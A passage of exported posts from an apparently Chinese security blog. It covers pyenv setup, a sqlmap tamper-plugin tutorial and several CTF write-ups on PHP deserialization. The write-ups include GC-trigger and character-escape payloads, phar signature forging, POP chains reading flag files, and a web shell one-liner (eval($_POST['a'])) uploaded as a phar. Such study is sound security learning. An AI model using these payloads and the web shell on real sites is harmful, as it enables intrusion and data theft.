[{"content":"Pyenv Python3 和 Python2 之间的差距 ， 以及Python3.10 的改动 Pyenv能方便的管理这些不同版本处于同一个系统。并且能全局切换不同的Python解释器以及Pip 操作简单，方便上手 一、安装 我是 Arch Linux ，直接 yay -S pyenv 或者pacman即可\n官方脚本安装\n1 2 3 curl https://pyenv.run | bash # or curl -L https://github.com/pyenv/pyenv-installer/raw/master/bin/pyenv-installer | bash 二、配置 bash\n1 2 3 4 5 echo \u0026#39;export PYENV_ROOT=\u0026#34;$HOME/.pyenv\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile echo \u0026#39;export PATH=\u0026#34;$PYENV_ROOT/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile echo -e \u0026#39;if command -v pyenv 1\u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then\\n eval \u0026#34;$(pyenv init -)\u0026#34;\\nfi\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile # 初始化 Zsh\n1 2 3 4 5 echo \u0026#39;export PYENV_ROOT=\u0026#34;$HOME/.pyenv\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.zshrc echo \u0026#39;export PATH=\u0026#34;$PYENV_ROOT/bin:$PATH\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.zshrc echo -e \u0026#39;if command -v pyenv 1\u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then\\n eval \u0026#34;$(pyenv init -)\u0026#34;\\nfi\u0026#39; \u0026gt;\u0026gt; ~/.zshrc # 初始化 三、基本使用 下载的版本位置：~/.pyenv/version/\n在使用 下载版本或者设置版本 的命令，不要加sudo否则安装到root环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 pyenv exec # 指定python版本执行某一个命令 pyenv global 3.xxx # 设置python全局版本 pyenv install # 安装某个版本的Python pyenv versions # 输出已经安装的python版本 pyenv version # 输出现在设置的python版本 pyenv rehash # 安装新版本后rehash一下 pyenv install -l # 输出全部能安装的Python ","date":"2023-05-18T00:00:00Z","image":"http://main1o.github.io/image31.png","permalink":"http://main1o.github.io/p/pyenv/","title":"Pyenv"},{"content":"sqlmap_tamper \u0026ndash;tamper [插件名]\nsqlmap/tamper 插件目录\nsqlmap脚本模块的用法\nCONCAT_WS 和concat()一样,将多个字符串连接成一个字符串\nJSON_ARRAYAGG() 函数将指定的列或者表达式的值聚合为一个 JSON 数组\n1 2 3 4 5 6 mysql\u0026gt; select JSON_ARRAYAGG(name) from user; +------------------------------------------------------------+ | JSON_ARRAYAGG(name) | +------------------------------------------------------------+ | [\u0026#34;main1o\u0026#34;, \u0026#34;main1o\u0026#34;, \u0026#34;main1o\u0026#34;, \u0026#34;main1o\u0026#34;, \u0026#34;main1o\u0026#34;, \u0026#34;demo\u0026#34;] | +------------------------------------------------------------+ sqlmap\\tamper 有非常灵活且自定义高的插件 Demo:\n1 2 3 4 5 6 7 8 9 10 11 from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage from lib.core.enums import DBMS __priority__ = PRIORITY.LOW def dependencies(): pass def tamper(payload, **kwargs): return payload 插件结构分为3部分:\nPRIORITY 定义tamper的优先级 ，对应的数字越高优先级也就越大\n1 __priority__ = PRIORITY.LOW 定义优先级的类 sqlmap\\lib\\core\\enums.py\n1 2 3 4 5 6 7 LOWEST = -100 LOWER = -50 LOW = -10 NORMAL = 0 HIGH = 10 HIGHER = 50 HIGHEST = 100 插件提示 1 2 def dependencies(): singleTimeWarnMessage(f\u0026#34;插件{os.path.basename(__file__)}只针对{DBMS.MYSQL}\u0026#34;) 参考 sqlmap\\lib\\core\\enums.py\ntamper 核心函数，处理payload 和请求头 需要实现的功能都在这里\npayload 为sqlmap注入原始语句 kwargs 则是处理请求头 处理多个括号 Demo 虽然sqlmap默认注入会自动闭合多个括号的参数，但是这里还是想写一下\u0026hellip;..\n测试的php代码:\n把原始注入的payload加上5个右括号用来闭合：\n1 2 3 4 5 6 7 def tamper(payload, **kwargs): dicts = payload.split(\u0026#39; \u0026#39;,1) dicts[0] = dicts[0] + \u0026#39;)))))\u0026#39; payload = \u0026#39; \u0026#39;.join(dicts) print(payload)\t# 打印查看 return payload 注入sql语句加上了5个右括号\n请求头 获取字典，添加元素，burp抓包查看\n1 2 3 def tamper(payload, **kwargs): headers = kwargs.get(\u0026#39;headers\u0026#39;) headers[\u0026#39;User-Agent\u0026#39;] = \u0026#39;main1o\u0026#39; 完整代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import os import random import string from lib.core.common import singleTimeWarnMessage from lib.core.compat import xrange from lib.core.enums import DBMS from lib.core.enums import PRIORITY __priority__ = PRIORITY.NORMAL def dependencies(): singleTimeWarnMessage(f\u0026#34;插件{os.path.basename(__file__)}只针对{DBMS.MYSQL}\u0026#34;) def tamper(payload, **kwargs): headers = kwargs.get(\u0026#39;headers\u0026#39;) headers[\u0026#39;User-Agent\u0026#39;] = \u0026#39;main1o\u0026#39; dicts = payload.split(\u0026#39; \u0026#39;,1) dicts[0] = dicts[0] + \u0026#39;)))))\u0026#39; payload = \u0026#39; \u0026#39;.join(dicts) return payload ","date":"2023-01-18T00:00:00Z","image":"http://main1o.github.io/CachedImage_2880_1800_POS4.jpg","permalink":"http://main1o.github.io/p/sqlmap_tamper/","title":"sqlmap_tamper"},{"content":"PHP底层 GC 垃圾回收机制 PHP: 引用计数基本知识 - Manual\n建议一定先看完 PHP官方手册的说明\n简单理解为一个对象没有被引用的时候 就会被GC机制回收 在被回收的同时 会触发__destruct()方法 这是一个关键点~\nrefcount变量引用计数 is_ref是否被引用 bool值\n调试工具Xdebug - Debugger and Profiler Tool for PHP 如果是小皮面板的话直接 php扩展开启就行了\nPHP不同版本下GC机制有变化 以下环境为PHP 5.4.45模拟\nPHP 深浅拷贝 在 PHP 中引用意味着用不同的名字访问同一个变量内容。这并不像 C 的指针：例如你不能对他们做指针运算，他们并不是实际的内存地址。替代的是，引用是符号表别名。注意在PHP 中，变量名和变量内容是不一样的，因此同样的内容可以有不同的名字。最接近的比喻是 Unix 的文件名和文件本身——变量名是目录条目，而变量内容则是文件本身。引用可以被看作是 Unix 文件系统中的硬链接\n引用取消 则需要使用unset()只是断开了变量名和变量内容之间的绑定,并不是说变量内容被销毁了\n深拷贝： 赋值时值完全复制对其中一个作出改变，不会影响另一个\n在PHP5以上，对象的 = 赋值和传递都是引用(浅)。php提供了clone函数实现拷贝副本\n直接把$a赋值给$b之后，$b修改并不会对$a任何影响，可以看到2次输出都是main1o\n变量$a引用计数值refcount也为1，并且is_ref也是false\n对象的深拷贝 用clone函数拷贝出一个完全一样的对象，修改该对象，并不会影响原始对象\n修改$a对象，只会对$b对象有影响，并不会对$c对象有任何影响\n浅拷贝： 赋值时，引用赋值，相当于取了一个别名。对其中一个修改，会影响另一个\n使用\u0026amp;来使用自定义引用变量，我们对$a进行修改 直接影响了$b “main1o” \u0026ndash;\u0026gt; \u0026ldquo;ikun\u0026rdquo;\n就是$a 和$b都指向内存中的同一块地址\n反序列化中的作用 补充：\n方法名 作用 __construct 构造函数，在创建对象时候初始化对象，一般用于对变量赋初值 __destruct 析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用 即对象被销毁触发！手动销毁为unset(Object) 手动销毁对象unset()触发了$a对象中的析构函数。提前输出了 1__destruct()\n还有对象引用被视为null 也会触发，这里举个例子\n变量赋值都是 自右向左 所以数组中的第二个元素0 覆盖了对象失去了引用，那么就满足触发GC回收了。即触发__destruct\nDemo : 最后一行代码错误抛出异常，是无法触发__destruct 需要正常结束程序\n那我们就可以通过上面介绍的触发GC机制 来绕过。这里将第二个索引置空。\nPayload：\n1 a:2:{i:0;O:1:\u0026#34;B\u0026#34;:0:{}i:0;i:0;} GC Phar反序列化利用: Phar反序列化，使用file_get_contents()函数，先按照正常流程去生成一个.phar文件\n生成步骤就不一一累述了，注意需要开启php.ini中的phar.readonly = Off\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php class test{public $code= \u0026#34;phpinfo();\u0026#34;;} $a = new test(); $c = array($a,0); $b = new Phar(\u0026#39;1.phar\u0026#39;,0); $b-\u0026gt;startBuffering(); $b-\u0026gt;setMetadata($c); $b-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER();?\u0026gt;\u0026#34;); $b-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;,\u0026#34;test\u0026#34;); $b-\u0026gt;stopBuffering(); 由于生成的phar文件不能随意修改，否则签名不匹配。先按照原来的方法修改数组值，然后在通过脚本进行伪造签名。\n使用16进制编辑器打开 可以看到i:1修改为i:0 保存\nexp.py\n1 2 3 4 5 6 7 8 import gzip from hashlib import sha1 with open(r\u0026#34;1.phar\u0026#34;, \u0026#34;rb\u0026#34;) as file: f = file.read() s = f[:-28] h = f[-8:] newf = s + sha1(s).digest() + h open(\u0026#34;2.phar\u0026#34;,\u0026#34;wb\u0026#34;).write(newf) 接着使用phar:// 伪协议包含2.phar这个文件即可,成功执行了\n例题： [ctf.show](https://ctf.show/challenges#easy unserialize-1806)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 \u0026lt;?php include(\u0026#34;./HappyYear.php\u0026#34;);\t// flag文件 class one { public $object; public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \u0026#34;Happy_func\u0026#34; \u0026amp;\u0026amp; $prev === \u0026#34;year_parm\u0026#34;) { global $talk; echo \u0026#34;$talk\u0026#34;.\u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; global $flag; echo $flag; } }); } public function __destruct() { @$this-\u0026gt;object-\u0026gt;add(); } public function __toString() { return $this-\u0026gt;object-\u0026gt;string; } } class second { protected $filename; protected function addMe() { return \u0026#34;Wow you have sovled\u0026#34;.$this-\u0026gt;filename; // 字符和对象进行拼接 可以触发one()::__toString() } public function __call($func, $args) { call_user_func([$this, $func.\u0026#34;Me\u0026#34;], $args);\t// 接受不存在的属性名和值，拼接然后通过call_user_func() 函数调用内部 } } class third { private $string; public function __construct($string) { $this-\u0026gt;string = $string; } public function __get($name) { $var = $this-\u0026gt;$name;\t// $name为外部传的值 $var[$name]();\t// 数组调用类 } } if (isset($_GET[\u0026#34;ctfshow\u0026#34;])) { $a=unserialize($_GET[\u0026#39;ctfshow\u0026#39;]); throw new Exception(\u0026#34;高一新生报道\u0026#34;); // 抛出异常会停止所有操作 } else { highlight_file(__FILE__); } POP链子：\none::__destruct =\u0026gt; second::__call=\u0026gt; second::addMe =\u0026gt; one::__toString =\u0026gt; third::__get =\u0026gt; one::MeMeMe\n因为异常抛出的原因，需要通过gc垃圾回收提前触发析构函数(__destruct())\n1 2 3 4 5 6 $a = new one(); $a-\u0026gt;object = new second(); $a-\u0026gt;object-\u0026gt;filename = new one(); @$a-\u0026gt;object-\u0026gt;filename-\u0026gt;object = new third(array(\u0026#34;string\u0026#34; =\u0026gt; [new one(), MeMeMe])); $b = array($a, NULL);\t// 置空数组 echo urlencode(serialize($b)); 注意数组需要设置为0达到提前销毁对象的目的 触发gc垃圾回收，%3A1%3B \u0026ndash;\u0026gt; %3A0%3B\n1 a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22thirdstring%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A1%3BN%3B%7D 改成：\n1 a%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A6%3A%22second%22%3A1%3A%7Bs%3A8%3A%22filename%22%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BO%3A5%3A%22third%22%3A1%3A%7Bs%3A13%3A%22thirdstring%22%3Ba%3A1%3A%7Bs%3A6%3A%22string%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A3%3A%22one%22%3A2%3A%7Bs%3A9%3A%22year_parm%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A10%3A%22Happy_func%22%3B%7Ds%3A6%3A%22object%22%3BN%3B%7Di%3A1%3Bs%3A6%3A%22MeMeMe%22%3B%7D%7D%7D%7D%7D%7Di%3A0%3BN%3B%7D 🔗参考链接 PHP新的垃圾回收机制 (yangxikun.com)\nPHP的GC机制 - M1kael‘s Blog\n浅析PHP GC垃圾回收机制及常见利用方式 - 先知社区 (aliyun.com)\n","date":"2022-09-09T00:00:00Z","image":"http://main1o.github.io/image46.png","permalink":"http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/","title":"PHP_GC垃圾回收机制"},{"content":"Php反序列化字符逃逸 个人理解的字符逃逸\n字符增加 demo_1: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class ik{ public $username = \u0026#39;m\u0026#39;; public $password = \u0026#39;ikun\u0026#39;; public function __construct($username){ $this-\u0026gt;username = $username; } public function __wakeup(){ if($this-\u0026gt;password === \u0026#39;ik\u0026#39;){ include(\u0026#39;flag.php\u0026#39;); echo PHP_EOL . $flag; # flag.php -\u0026gt; flag{this_flag} }else{ echo \u0026#34;哎呦 你干嘛~\u0026#34;; } } } function filter($obj){ return str_replace(\u0026#39;l\u0026#39;,\u0026#39;ll\u0026#39;,$obj); } $username = $_GET[\u0026#39;a\u0026#39;]; $obj = serialize(new ik($username)); $ter = filter($obj); unserialize($ter); __wakeup()魔术方法会在反序列化时，判断属性password是否是ik然后在引入flag。但是类中唯一的传值点就在**$username**\nfilter()方法对类ik的对象进行替换会多出一个字符，反序列化是从左往右读的,只读键的长度,多出了字符就忽略，那么这个就叫字符逃逸。可以对**$username进行逃逸，从而覆盖到$password**\n1 2 3 O:4:\u0026#34;demo\u0026#34;:1:{s:4:\u0026#34;name\u0026#34;;s:2:\u0026#34;iki\u0026#34;;} # 2:\u0026#34;iki\u0026#34; 这里键的长度为3，只读键的长度多了一个i。从左往右读，那么这个\u0026#39;}\u0026#39;就是逃逸(忽略)了的 比如:\n1 2 3 4 5 6 7 8 \u0026lt;?php class ik{ public $username = \u0026#39;m\u0026#39;; public $password = \u0026#39;ik\u0026#39;; } print_r(serialize(new ik())); # O:2:\u0026#34;ik\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:1:\u0026#34;m\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:2:\u0026#34;ik\u0026#34;;} 这\u0026quot;;s:8:\u0026quot;password\u0026quot;;s:2:\u0026quot;ik\u0026quot;;}就是要逃逸的字符数量27。php通过;}来判断反序列化的结束标志。因为之前的filter()将1个l替换为2个l，多了一个l。所以要逃逸我们的payload需要27个l然后拼接\n1 lllllllllllllllllllllllllll\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:2:\u0026#34;ik\u0026#34;;} demo_2: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); class ik{ public $username = \u0026#39;m\u0026#39;; public $password = \u0026#39;ik\u0026#39;; public function __construct($username){ $this-\u0026gt;username = $username; } public function __wakeup(){ if($this-\u0026gt;password === \u0026#39;ikun\u0026#39;){ include(\u0026#39;flag.php\u0026#39;); echo PHP_EOL . $flag; # flag.php -\u0026gt; flag{this_flag} }else{ echo \u0026#34;哎呦 你干嘛~\u0026#34;; } } } function filter($obj){ return str_replace(\u0026#39;main1o\u0026#39;,\u0026#39;main1oikun\u0026#39;,$obj); } $username = $_GET[\u0026#39;a\u0026#39;]; $obj = serialize(new ik($username)); $ter = filter($obj); unserialize($ter); 和demo_1类似的，不过filter每次替换多4个字符，payload：\n1 2 3 4 5 6 7 8 \u0026lt;?php class ik{ public $username = \u0026#39;m\u0026#39;; public $password = \u0026#39;ikun\u0026#39;; } print_r(serialize(new ik())) # O:2:\u0026#34;ik\u0026#34;:2:{s:8:\u0026#34;username\u0026#34;;s:1:\u0026#34;m\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:4:\u0026#34;ikun\u0026#34;;} \u0026quot;;s:8:\u0026quot;password\u0026quot;;s:4:\u0026quot;ikun\u0026quot;;}是需要逃逸的字符一共29。但是，使用7个main1o，则会少一个字符，使用8个main1o 则会多3个。我们选择8个main1o ，只需要在需要逃逸的字符，后面在添加3个任意字符代替即可。\n1 2 3 main1omain1omain1omain1omain1omain1omain1omain1o\u0026#34;;s:8:\u0026#34;password\u0026#34;;s:4:\u0026#34;ikun\u0026#34;;}aaa # 添加3个a 字符减少 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php error_reporting(0); highlight_file(__FILE__); $arr[\u0026#39;user\u0026#39;] = $_GET[\u0026#39;user\u0026#39;]; $arr[\u0026#39;pass\u0026#39;] = $_GET[\u0026#39;pass\u0026#39;]; function filter($str){ return str_replace(\u0026#39;aa\u0026#39;,\u0026#39;a\u0026#39;,$str); } $q = serialize($arr); $w = filter($q); echo \u0026#39;过滤前:\u0026#39;. $q . \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo \u0026#39;过滤后:\u0026#39;. $w . \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; $e = unserialize($w); echo \u0026#39;pass = \u0026#39; . $e[\u0026#39;pass\u0026#39;]; 正常传参\n加入aa后被过滤了的，导致少了一个字符。所以向后面吃掉一个字符，导致反序列化失败\n反之，只需要计算出它需要吃掉的字符，在添加字符填补，即可反序列化成功。\n我们的payload一共27个字符 \u0026quot;;s:4:\u0026quot;pass\u0026quot;;s:6:\u0026quot;123456\u0026quot;;} 知道2个aa会变一个a，所以a需要57个(payload * 2)\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026amp;pass=\u0026quot;;s:4:\u0026quot;pass\u0026quot;;s:6:\u0026quot;123456\u0026quot;;}\n紫色的pass为键，27个字符为我们的payload前面有\u0026quot;形成闭合。紫色部分为19个字符，所以填充字符为8个 （54减去红色的27个a减去紫色部分19）\n任意填充8个即可：\n","date":"2022-08-24T00:00:00Z","image":"http://main1o.github.io/image1.png","permalink":"http://main1o.github.io/p/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/","title":"反序列化字符逃逸"},{"content":"2022强网先锋 rcefile 环境下载地址\n代码审计\nspl_autoload_register 说明\nspl_autoload_register()在没有限制的情况，new有一个当前不存在的类test，spl_autoload_register会自动去当前目录下包含文件名为test.php 或者是test.inc\nunserialize反序列化本地cookie[\u0026lsquo;userfile\u0026rsquo;]\nupload.php\n在39行黑名单中并没有对 phar 后缀进行过滤\n上传文件 1.jpg 内容\n1 2 3 4 \u0026lt;?php phpinfo(); eval($_POST[\u0026#39;a\u0026#39;]); 修改后缀 为 1.phar 并 查看图片获取重命名之后的图片名称\n使用这个名称去构建一个序列化对象 ，config.inc.php去cookie里找，并进行反序列化。触发**spl_autoload_register()**去包含\nafd4b9668ced586e2528dc1863a650fd.inc\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;?php class afd4b9668ced586e2528dc1863a650fd{ # 不能数字开头 function __construst(){ } } $s = new afd4b9668ced586e2528dc1863a650fd(); echo serialize($s); # O:32:\u0026#34;afd4b9668ced586e2528dc1863a650fd\u0026#34;:0:{} ","date":"2022-08-17T00:00:00Z","image":"http://main1o.github.io/1.png","permalink":"http://main1o.github.io/p/2022%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B-rcefile/","title":"2022强网先锋  rcefile"},{"content":"[SWPUCTF 2018]SimplePHP 任意文件包含？\n大概有这几个文件。可以读取file.php，function.php，class.php，base.php文件的源码\nfile.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php header(\u0026#34;content-type:text/html;charset=utf-8\u0026#34;); include \u0026#39;function.php\u0026#39;; include \u0026#39;class.php\u0026#39;; ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/var/www/html/\u0026#39;); $file = $_GET[\u0026#34;file\u0026#34;] ? $_GET[\u0026#39;file\u0026#39;] : \u0026#34;\u0026#34;; if(empty($file)) { echo \u0026#34;\u0026lt;h2\u0026gt;There is no file to show!\u0026lt;h2/\u0026gt;\u0026#34;; } $show = new Show(); if(file_exists($file)) { $show-\u0026gt;source = $file; $show-\u0026gt;_show(); // 这里传的 $file 到 class.php文件中去形成文件读取了 } else if (!empty($file)){ die(\u0026#39;file doesn\\\u0026#39;t exists.\u0026#39;); } ?\u0026gt; function.php\n文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 \u0026lt;?php //show_source(__FILE__); include \u0026#34;base.php\u0026#34;; header(\u0026#34;Content-type: text/html;charset=utf-8\u0026#34;); error_reporting(0); function upload_file_do() { global $_FILES; $filename = md5($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;].$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]).\u0026#34;.jpg\u0026#34;; //mkdir(\u0026#34;upload\u0026#34;,0777); if(file_exists(\u0026#34;upload/\u0026#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $filename); echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;上传成功!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; } function upload_file() { global $_FILES; if(upload_file_check()) { upload_file_do(); } } function upload_file_check() { global $_FILES; $allowed_types = array(\u0026#34;gif\u0026#34;,\u0026#34;jpeg\u0026#34;,\u0026#34;jpg\u0026#34;,\u0026#34;png\u0026#34;); $temp = explode(\u0026#34;.\u0026#34;,$_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;]); $extension = end($temp); if(empty($extension)) { //echo \u0026#34;\u0026lt;h4\u0026gt;请选择上传的文件:\u0026#34; . \u0026#34;\u0026lt;h4/\u0026gt;\u0026#34;; } else{ if(in_array($extension,$allowed_types)) { return true; } else { echo \u0026#39;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;Invalid file!\u0026#34;);\u0026lt;/script\u0026gt;\u0026#39;; return false; } } } ?\u0026gt; base.php\n前端展示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 \u0026lt;?php session_start(); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;web3\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;nav class=\u0026#34;navbar navbar-default\u0026#34; role=\u0026#34;navigation\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;navbar-header\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;index.php\u0026#34;\u0026gt;首页\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbra-toggle\u0026#34;\u0026gt; \u0026lt;li class=\u0026#34;active\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;file.php?file=\u0026#34;\u0026gt;查看文件\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;upload_file.php\u0026#34;\u0026gt;上传文件\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;ul class=\u0026#34;nav navbar-nav navbar-right\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;index.php\u0026#34;\u0026gt;\u0026lt;span class=\u0026#34;glyphicon glyphicon-user\u0026#34;\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;?php echo $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;];?\u0026gt;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;!--flag is in f1ag.php--\u0026gt; class.php\n魔法方法出现最多的一个php文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 \u0026lt;?php class C1e4r { public $test; public $str; public function __construct($name) { $this-\u0026gt;str = $name; } public function __destruct() { $this-\u0026gt;test = $this-\u0026gt;str; echo $this-\u0026gt;test; } } class Show { public $source; public $str; public function __construct($file) { $this-\u0026gt;source = $file; echo $this-\u0026gt;source; } public function __toString() { $content = $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; return $content; } public function __set($key,$value) { $this-\u0026gt;$key = $value; } public function _show() { if(preg_match(\u0026#39;/http|https|file:|gopher|dict|\\.\\.|f1ag/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker!\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker~\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $file; public $params; public function __construct() { $this-\u0026gt;params = array(); } public function __get($key) // 传入点 { return $this-\u0026gt;get($key); } public function get($key) { if(isset($this-\u0026gt;params[$key])) { $value = $this-\u0026gt;params[$key]; } else { $value = \u0026#34;index.php\u0026#34;; } return $this-\u0026gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); // 任意文件读取点 return $text; } } ?\u0026gt; 调用Test类中的file_get()方法任意文件读取，get()会调用file_get()方法，传入$value参数，if判断$this-\u0026gt;params[$key]是否有值，没有则传index.php给file_get去读取。但是前面还有一个构造函数__contruct()，定义params为一个数组，__get则去调用get()方法，所以只要触发__get() 方法即可～ ，__get() 魔术方法在读取不存在的属性自动触发！\n1 2 Test::__construct() Test::__get() --\u0026gt; get() --\u0026gt; file_get().file_get_contents() // 读取文件 Show类中的__toString()中的$content = $this-\u0026gt;str['str']-\u0026gt;source则是获取一个叫source的属性。假设str['str'] = new Test()读取不存在的属性source刚好就能触发__get()方法！\n__toString()把对象当成字符输出自动触发～，在C1e4r中__destruct()对象被销毁触发，能打印输出值，只要设置$this-\u0026gt;test为new show()对象即可，\n1 2 3 # 构造 C1e4r::__destruct --\u0026gt; Show::toString() --\u0026gt; Test::__get() --\u0026gt;get()--\u0026gt;file_get_contents() POP：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php class C1e4r { public $test; public $str; } class Show { public $source; public $str; } class Test { public $file; public $params; } $c = new C1e4r(); $show = new Show(); $test = new Test(); $test-\u0026gt;parms[\u0026#39;source\u0026#39;]=\u0026#34;/var/www/html/f1ag.php\u0026#34;; // 为什么设置\u0026#39;source\u0026#39;? 因为: $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; $c-\u0026gt;str = $show; $show-\u0026gt;str[\u0026#39;str\u0026#39;]=$test; $phar=new 